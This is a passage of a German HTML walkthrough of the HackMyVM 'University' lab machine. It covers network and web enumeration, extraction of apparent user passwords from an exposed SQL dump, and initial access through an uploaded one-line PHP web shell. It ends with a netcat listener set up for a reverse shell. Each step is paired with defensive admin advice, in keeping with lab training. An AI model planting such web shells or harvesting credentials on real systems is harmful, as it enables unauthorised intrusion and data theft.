@@ -1,0 +1,1193 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>University - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün) enthalten:
+         - .level-container h2 color auf lime (oder ein Grün)
+         - .segment-1, .segment-2, .segment-3 background-color auf lime (oder ein Grün)
+         - Die Header- und Inner-Circle-Farben sollten auf den Standardwerten (#3498db / #2980b9) bleiben oder angepasst werden, falls gewünscht.
+    -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>University - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe 'lime' (oder ein Grün) wird durch die CSS-Datei gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben 'lime' (oder ein Grün) werden durch die CSS-Datei gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe wird durch die CSS-Datei gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">curl (impliziert)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">env</div>
+                <div class="tool-item">dmesg</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">gerapy (als Exploit-Ziel)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-prep">Privilege Escalation Preparation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerk. `arp-scan -l` sendet ARP-Pakete, um Geräte im lokalen Subnetz zu finden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.128	08:00:27:0a:b3:bb	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP-Adresse 192.168.2.128 wurde gefunden. Die MAC-Adresse und der Herstellerhinweis deuten erneut auf eine VirtualBox-VM hin. Dies ist unser Zielsystem.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Port-Scan auf 192.168.2.128 durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerküberwachung auf ungewöhnliche ARP-Aktivitäten. Netzwerksegmentierung kann die Sichtbarkeit einschränken.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird gestartet, um offene Ports, Dienste, Versionen und das Betriebssystem zu ermitteln. Die Optionen `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (Aggressive Optionen) und `-p-` (alle Ports) werden verwendet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.128 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-21 13:40 CET
+Nmap scan report for university (192.168.2.128)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 8eeeda29f1ae03a5c37e4584c78667ce (RSA)
+|   256 f81cef967bae74216c9f069b200ad856 (ECDSA)
+|_  256 19fc9432419d436f52c5ba5af083b45b (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-git:
+|   192.168.2.128:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Remotes:
+|_      https://github.com/rskoolrash/nline-Admission-System
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:0A:B3:BB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms university (192.168.2.128)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.99 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Zwei offene Ports: 22 (SSH, OpenSSH 8.4p1) und 80 (HTTP, nginx 1.18.0). Der HTTP-Server läuft auf Debian Linux. Wichtige Erkenntnisse vom Nmap-Skriptscan (`-sC`):
+                1.  **Kein `httponly`-Flag:** Das `PHPSESSID`-Cookie hat kein `httponly`-Flag, was es anfällig für Diebstahl durch Cross-Site-Scripting (XSS) macht.
+                2.  **.git-Verzeichnis:** Ein Git-Repository wurde im Web-Root (`/.git/`) gefunden. Dies ist eine **kritische Informationspreisgabe**, da es ermöglicht, den gesamten Quellcode der Webanwendung herunterzuladen.
+                3.  **GitHub-Remote:** Das Repository verweist auf `https://github.com/rskoolrash/nline-Admission-System`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorität 1:** Untersuchen Sie das exponierte `.git`-Verzeichnis. Versuchen Sie, es mit Tools wie `git-dumper` oder manuell herunterzuladen, um den Quellcode zu erhalten. Klonen Sie auch das öffentliche GitHub-Repository. Untersuchen Sie den Quellcode auf Schwachstellen. **Priorität 2:** Untersuchen Sie die Webanwendung auf Port 80 weiter (Verzeichnissuche, Schwachstellenscans).
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Entfernen Sie sofort das `.git`-Verzeichnis aus dem Web-Root. Stellen Sie sicher, dass Deployment-Prozesse keine Versionskontrollverzeichnisse in öffentlich zugänglichen Bereichen hinterlassen. Setzen Sie das `httponly`-Flag für alle Session-Cookies, um das Risiko von Session-Hijacking durch XSS zu mindern. Halten Sie nginx und OpenSSH aktuell.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem offenen Port 80 wird `gobuster` verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden.
+                `dir`: Verzeichnissuche-Modus.
+                `-u`: Ziel-URL.
+                `-x`: Liste von Dateiendungen, die getestet werden sollen.
+                `-w`: Pfad zur Wortliste (`directory-list-2.3-medium.txt`).
+                `-b '403,404'`: Statuscodes, die ignoriert werden sollen.
+                `-e`: Erweiterter Modus (testet Einträge als Dateien und Verzeichnisse).
+                `-t 100`: Anzahl der Threads (sehr hoch).
+                `-n`: Keinen Statuscode in der Ausgabe anzeigen.
+                `-k`: Unsichere SSL/TLS-Zertifikate ignorieren (hier nicht relevant für HTTP).
+                Die Information über das Cookie `PHPSESSID` wird ebenfalls notiert, stammt aber wahrscheinlich aus einer Browser-Interaktion, nicht direkt aus `gobuster`.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.128 -x zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,php,txt -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.128
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,kdbx,php,txt
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] Skip Tls verification:   true
+===============================================================
+2022/11/21 13:42:42 Starting gobuster
+===============================================================
+http://192.168.2.128/index.php            [Size: 2126]
+http://192.168.2.128/images               [Size: 169] [--> http://192.168.2.128/images/]
+http://192.168.2.128/banner.jpg           [Size: 157626]
+http://192.168.2.128/mail                 [Size: 169] [--> http://192.168.2.128/mail/]
+http://192.168.2.128/a.php                [Size: 0]
+http://192.168.2.128/signup.php           [Size: 8008]
+http://192.168.2.128/documents.php        [Size: 6317]
+http://192.168.2.128/admin.php            [Size: 3827]
+http://192.168.2.128/css                  [Size: 169] [--> http://192.168.2.128/css/]
+http://192.168.2.128/status.php           [Size: 0]
+http://192.168.2.128/tabs.php             [Size: 4031]
+http://192.168.2.128/logout.php           [Size: 0] [--> index.php]
+http://192.168.2.128/captcha.php          [Size: 0]
+http://192.168.2.128/validate.php         [Size: 18]
+http://192.168.2.128/combo                [Size: 169] [--> http://192.168.2.128/combo/]
+http://192.168.2.128/oas.sql              [Size: 8801]
+http://192.168.2.128/bootstrap            [Size: 169] [--> http://192.168.2.128/bootstrap/]
+http://192.168.2.128/editform.php         [Size: 1391]
+http://192.168.2.128/fileupload.php       [Size: 1]
+http://192.168.2.128/global_search.php    [Size: 0]
+http://192.168.2.128/jquery               [Size: 169] [--> http://192.168.2.128/jquery/]
+http://192.168.2.128/viewdoc.php          [Size: 0]
+===============================================================
+2022/11/21 13:43:29 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `gobuster` fand mehrere interessante Dateien und Verzeichnisse. Besonders hervorzuheben sind:
+                *   `/admin.php`: Eine administrative Schnittstelle.
+                *   `/oas.sql`: Eine SQL-Dump-Datei. Solche Dateien enthalten oft Datenbankstrukturen und -inhalte, möglicherweise auch Benutzerdaten und Hashes. Dies ist eine **schwerwiegende Informationspreisgabe**.
+                *   `/signup.php`: Eine Registrierungsseite.
+                *   `/fileupload.php`: Eine Datei für Uploads, ein potenzieller Vektor für Web-Shells.
+                *   Diverse andere PHP-Dateien, die Funktionalität andeuten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorität 1:** Laden Sie die Datei `/oas.sql` herunter und analysieren Sie sie auf sensible Daten, insbesondere Benutzernamen und Passwort-Hashes. **Priorität 2:** Untersuchen Sie `/admin.php`, `/fileupload.php` und `/signup.php` genauer. Versuchen Sie, sich mit gefundenen Anmeldedaten anzumelden oder die Upload-Funktion auszunutzen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Entfernen Sie die Datei `/oas.sql` sofort vom Webserver. Datenbank-Dumps dürfen niemals in einem öffentlich zugänglichen Webverzeichnis liegen. Überprüfen Sie alle gefundenen PHP-Dateien auf Notwendigkeit und Sicherheit. Sichern Sie Upload-Funktionen rigoros ab (siehe vorherige Empfehlungen). Beschränken Sie den Zugriff auf administrative Seiten.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser Abschnitt zeigt Ausschnitte aus dem Quellcode, die vermutlich bei der Untersuchung der gefundenen PHP-Dateien (wahrscheinlich `admin.php` oder eine verwandte Datei) entdeckt wurden. Der JavaScript-Teil zeigt eine Autocomplete-Funktion, die Daten von `global_search.php` bezieht und eine AJAX-Anfrage an `admin.php` sendet. Der HTML/PHP-Teil zeigt eine Meldung, dass ein Login erforderlich ist, um auf die Seite zuzugreifen (`adminlogin.php`).
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, da dies Quellcode-Analyse ist -->
+                <pre>
+Found:
+
+$(function() {
+
+$("#search2").autocomplete({
+source: "global_search.php",
+minLength: 2,
+select: function(event, ui) {
+var getUrl = ui.item.id;
+if(getUrl != '#') {
+
+    var kk = $("#search2").val();
+    $.ajax({
+        type : "GET",
+        cache : false,
+        url : "admin.php",
+        data : {
+            srchk1 : kk
+        },
+        success : function(response) {
+         // alert(response);
+          $("#showomr").val(response);
+        }
+    });
+
+}
+},
+
+html: true,
+//    showname showomr submitmarks
+
+});
+
+});
+script
+
+ You are not Logged In Please Login to Access this Page
+ref=adminlogin.php>Click Here to Login<>
+                </pre>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt, dass `/admin.php` eine Authentifizierung erfordert und über `adminlogin.php` zugänglich ist. Zeigt Interaktionspunkte (`global_search.php`, AJAX an `admin.php`), die auf potenzielle Schwachstellen wie SQL-Injection oder Cross-Site-Scripting untersucht werden könnten, falls ein Login gelingt oder umgangen werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Analyse von `oas.sql`, um Anmeldedaten für `adminlogin.php` zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Eingaben serverseitig validiert werden, um Injection-Angriffe zu verhindern. Schützen Sie administrative Endpunkte robust.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird erneut ausgeführt, um spezifische Webserver-Schwachstellen zu identifizieren. `-h` gibt das Ziel an.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.128</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.128
++ Target Hostname:    192.168.2.128
++ Target Port:        80
++ Start Time:         2022-11-21 13:45:20 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Cookie PHPSESSID created without the httponly flag
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-3092: /admin.php: This might be interesting...
++ OSVDB-3092: /.git/index: Git Index file may contain directory listing information.
++ /.git/HEAD: Git HEAD file found. Full repo details may be present.
++ /.git/config: Git config file found. Infos about repo details may be present.
++ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
++ 7915 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-11-21 13:46:15 (GMT1) (55 seconds)
+---------------------------------------------------------------------------
++ Allowed HTTP Methods: GET, HEAD, POST
++ Public HTTP Methods: GET, HEAD, POST
+---------------------------------------------------------------------------
+                    </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `nikto` bestätigt frühere Funde: fehlende Sicherheitsheader (`X-Frame-Options`, `X-XSS-Protection`, `X-Content-Type-Options`), kein `httponly`-Flag beim Cookie und das exponierte `.git`-Verzeichnis. Es meldet auch URLs (`/admin.php?...`), die auf eine potenziell verwundbare Anwendung (EasyNews 4.3) hindeuten könnten, obwohl dies ein False Positive sein kann, da die Anwendung wahrscheinlich eine andere ist (Online Admission System). Das Vorhandensein des `.git`-Verzeichnisses bleibt der kritischste Fund.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fokus bleibt auf dem `.git`-Verzeichnis und der Analyse von `oas.sql`. Die Nikto-Funde bezüglich EasyNews können vorerst ignoriert werden, wenn die Quellcodeanalyse ergibt, dass es sich um eine andere Anwendung handelt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Sichern Sie Cookies mit `httponly`. **Entfernen Sie das `.git`-Verzeichnis.**
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser Befehl versucht, Daten zu extrahieren, höchstwahrscheinlich aus der zuvor gefundenen `oas.sql`-Datei, obwohl der Befehl fälschlicherweise `cat user.txt` verwendet. Die Pipeline (`awk '{print $5}' | tr -d "'" | tr -d "," | tr "@" " " | awk '{print $1}'`) ist darauf ausgelegt, das fünfte Feld zu nehmen, Anführungszeichen und Kommas zu entfernen, das '@'-Zeichen durch ein Leerzeichen zu ersetzen und dann das erste Feld des Ergebnisses zu drucken. Dies zielt typischerweise darauf ab, Benutzernamen oder Passwörter aus SQL-INSERT-Anweisungen oder ähnlichen Formaten zu extrahieren.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat user.txt| awk '{print $5}' | tr -d "'" | tr -d "," | tr "@" " " | awk '{print $1}'</span></div>
+                    <pre>
+`s_pwd`
+Kumari
+artijha15
+artijha16
+dilrajkaur18
+Saigal
+anshsinha0309
+abc
+130301csl062
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Obwohl der `cat user.txt`-Teil falsch ist, zeigt die Ausgabe (`s_pwd`, `Kumari`, usw.), dass die Pipeline erfolgreich Daten aus der *eigentlichen Quelle* (vermutlich `oas.sql`) extrahiert hat. `s_pwd` sieht wie ein Spaltenname für Passwörter aus, und die folgenden Einträge könnten Benutzernamen oder Passwörter sein. Dies sind wertvolle Informationen für Anmeldeversuche.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Korrigieren Sie den Befehl, um `oas.sql` zu parsen (`cat oas.sql | awk ...`). Analysieren Sie `oas.sql` gründlicher, um die extrahierten Werte korrekt zuzuordnen (sind es Benutzernamen, Passwörter, oder beides?). Versuchen Sie, sich mit diesen Werten bei `adminlogin.php` anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie die `oas.sql`-Datei. Überprüfen Sie die Datenbank auf schwache oder Standardpasswörter. Implementieren Sie Passwort-Hashing mit starken Algorithmen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Versuch, eine der von Nikto gemeldeten URLs direkt aufzurufen. Dies zielt darauf ab, zu sehen, ob ein direkter Zugriff auf administrative Funktionen ohne Login möglich ist.
+            </p>
+            <div class="code-block">
+                 <!-- Kein Terminal-Prompt, da dies eine URL-Aktion ist -->
+                 <pre>
+http://192.168.2.128/admin.php?en_log_id=0&action=users:admin
+
+You are not Logged In Please Login to Access this Page
+Click Here to Login
+                 </pre>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Versuch schlägt fehl. Die Anwendung leitet korrekt zur Login-Seite um und verhindert den direkten Zugriff. Dies bestätigt, dass ein Login erforderlich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentration auf das Erlangen gültiger Anmeldedaten (aus `oas.sql` oder Quellcode) oder das Finden von Login-Bypass-Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Authentifizierung scheint hier korrekt zu funktionieren. Stellen Sie sicher, dass dies für alle administrativen Endpunkte gilt.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Das im `nmap`-Scan identifizierte öffentliche GitHub-Repository wird mit `git clone` heruntergeladen. Dies ermöglicht eine lokale Analyse des Quellcodes.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">git clone https://github.com/rskoolrash/nline-Admission-System</span></div>
+                    <pre>
+Klone nach 'nline-Admission-System'...
+remote: Enumerating objects: 138, done.
+remote: Total 138 (delta 0), reused 0 (delta 0), pack-reused 138
+Empfange Objekte: 100% (138/138), 8.34 MiB | 400.00 KiB/s, fertig.
+Löse Unterschiede auf: 100% (19/19), fertig.
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Quellcode der Anwendung wurde erfolgreich heruntergeladen. Dies ist eine Goldgrube für die Schwachstellensuche, da der Code nun offline analysiert werden kann, ohne den Live-Server zu belasten oder Alarme auszulösen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Quellcode sorgfältig auf häufige Web-Schwachstellen: SQL-Injection, Cross-Site-Scripting (XSS), Local/Remote File Inclusion (LFI/RFI), unsichere Dateiuploads, Authentifizierungs-Bypässe, harteingekodierte Anmeldedaten usw. Vergleichen Sie den geklonten Code mit dem auf dem Server (falls möglich, z.B. über das exponierte `.git`-Verzeichnis), um eventuelle Unterschiede oder lokale Modifikationen zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Code, der in öffentliche Repositories hochgeladen wird, keine sensiblen Informationen (wie API-Schlüssel, Passwörter) enthält. Überprüfen und bereinigen Sie den Code regelmäßig auf Sicherheitsschwachstellen.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein weiterer `gobuster`-Scan wird durchgeführt, diesmal mit einer anderen Wortliste (`dirb/big.txt`) und einem engeren Fokus auf die Erweiterungen `.php` und `.txt`. Die hohe Thread-Anzahl (`-t 6`) ist ungewöhnlich niedrig für `gobuster`, könnte aber an Systemressourcen liegen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -t 6 -u http://192.168.2.128/ -x php,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.128/
+[+] Method:                  GET
+[+] Threads:                 6
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Status codes:            200,204,301,302,307,401,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/11/21 13:50:11 Starting gobuster
+===============================================================
+http://192.168.2.128/a.php                (Status: 200) [Size: 0]
+http://192.168.2.128/admin.php            (Status: 200) [Size: 3827]
+http://192.168.2.128/adminlogin.php       (Status: 200) [Size: 2666]
+http://192.168.2.128/captcha.php          (Status: 500) [Size: 0]
+http://192.168.2.128/combo                (Status: 301) [Size: 169] [--> http://192.168.2.128/combo/]
+http://192.168.2.128/css                  (Status: 301) [Size: 169] [--> http://192.168.2.128/css/]
+http://192.168.2.128/documents.php        (Status: 200) [Size: 6317]
+http://192.168.2.128/fileupload.php       (Status: 200) [Size: 1]
+http://192.168.2.128/images               (Status: 301) [Size: 169] [--> http://192.168.2.128/images/]
+http://192.168.2.128/index.php            (Status: 200) [Size: 2126]
+http://192.168.2.128/jquery               (Status: 301) [Size: 169] [--> http://192.168.2.128/jquery/]
+http://192.168.2.128/logout.php           (Status: 302) [Size: 0] [--> index.php]
+http://192.168.2.128/mail                 (Status: 301) [Size: 169] [--> http://192.168.2.128/mail/]
+http://192.168.2.128/nbproject            (Status: 301) [Size: 169] [--> http://192.168.2.128/nbproject/]
+http://192.168.2.128/signup.php           (Status: 200) [Size: 8008]
+http://192.168.2.128/status.php           (Status: 200) [Size: 0]
+http://192.168.2.128/tabs.php             (Status: 200) [Size: 4031]
+http://192.168.2.128/validate.php         (Status: 200) [Size: 18]
+===============================================================
+2022/11/21 13:55:32 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Scan bestätigt die zuvor gefundenen PHP-Dateien und fügt `/adminlogin.php` und das Verzeichnis `/nbproject` (NetBeans-Projektdateien) hinzu. `/adminlogin.php` ist das wahrscheinlichste Ziel für die Verwendung der extrahierten Anmeldedaten. `/nbproject` ist eine weitere Informationspreisgabe, die Details über die Entwicklungsumgebung verraten könnte.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie die aus `oas.sql` (oder Quellcode) extrahierten Anmeldedaten, um einen Login über `/adminlogin.php` zu versuchen. Untersuchen Sie den Inhalt von `/nbproject`, falls zugänglich.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie Entwicklungsartefakte wie `/nbproject` aus Produktionsumgebungen.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine einfache PHP-Web-Shell (`benhacker.php`) wird erstellt. Diese Shell nimmt einen Befehl über den GET-Parameter `cmd` entgegen und führt ihn über die PHP-Funktion `system()` aus. Der Pfad `[/home/cyber/Downloads]` deutet darauf hin, dass dies auf dem lokalen Rechner des Pentesters geschieht.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">vi benhacker.php</span></div>
+                     <pre>
+<?php system($_REQUEST["cmd"]); ?>
+                     </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist die Vorbereitung des Payloads für einen Remote Code Execution (RCE)-Angriff, der wahrscheinlich durch Ausnutzung der `/fileupload.php`-Funktion erfolgen soll.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, diese `benhacker.php`-Datei über `/fileupload.php` (oder eine andere gefundene Upload-Möglichkeit) auf den Server hochzuladen. Bestimmen Sie den Pfad, in dem hochgeladene Dateien gespeichert werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie eine strikte Dateiupload-Validierung: Überprüfen Sie Dateitypen serverseitig (nicht nur über den `Content-Type`-Header oder die Dateiendung), scannen Sie hochgeladene Dateien auf Malware/Web-Shells, speichern Sie Uploads außerhalb des Web-Roots oder in einem Verzeichnis ohne Ausführungsrechte, und verwenden Sie nicht erratbare Dateinamen für gespeicherte Dateien.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die hochgeladene Web-Shell wird aufgerufen. Der Pfad `/studentpic/` deutet darauf hin, dass die Upload-Funktion Dateien in dieses Verzeichnis speichert. Der Befehl `id` wird über den `cmd`-Parameter übergeben.
+            </p>
+             <div class="code-block">
+                 <!-- Kein Terminal-Prompt, da dies eine URL-Aktion ist -->
+                 <pre>
+http://192.168.2.128/studentpic/benhacker.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                 </pre>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg! Die Web-Shell wurde erfolgreich hochgeladen und ausgeführt. Der `id`-Befehl wurde ausgeführt und zeigt, dass der Code im Kontext des Benutzers `www-data` (der typische Benutzer für Webserver wie Apache oder Nginx unter Debian/Ubuntu) läuft. **Initial Access wurde erlangt.**
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die Web-Shell, um eine stabilere Reverse Shell zum Angreifer-System aufzubauen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Entfernen Sie die Web-Shell (`benhacker.php`) und alle anderen verdächtigen Dateien aus dem `/studentpic`-Verzeichnis (und anderen Upload-Verzeichnissen). Beheben Sie die unsichere Dateiupload-Schwachstelle. Überprüfen Sie das System auf weitere Kompromittierungen. Ändern Sie alle Passwörter.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Netcat-Listener wird auf dem Angreifer-System (192.168.2.109) auf Port 9001 gestartet, um eine eingehende Reverse Shell abzufangen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+                     </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Listener ist bereit, die Verbindung vom Zielsystem entgegenzunehmen.
+            </p>
+            <p class="recommendation">
